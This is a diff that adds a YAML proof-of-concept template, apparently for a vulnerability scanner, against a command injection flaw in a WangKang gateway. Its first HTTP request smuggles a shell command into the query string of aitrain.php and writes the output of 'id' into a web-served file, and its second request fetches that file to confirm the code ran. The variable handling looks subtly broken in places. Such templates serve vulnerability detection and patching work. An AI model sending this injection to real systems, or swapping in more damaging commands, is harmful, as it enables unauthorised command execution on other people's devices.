@@ -1,0 +1,41 @@
+id: poc-yaml-wangkang-gateway-rce
+info:
+  name: WangKang Gateway Remote Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        GET /scripts/aitrain.php?1+delete+test;id>../css/{{random}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    extractors:
+      - type: regex
+        name: random
+        internal: true
+        part: path
+        regex:
+          - "../css/(.*?)"
+  - raw:
+      - |
+        GET /css/{{random}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+          - "groups"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
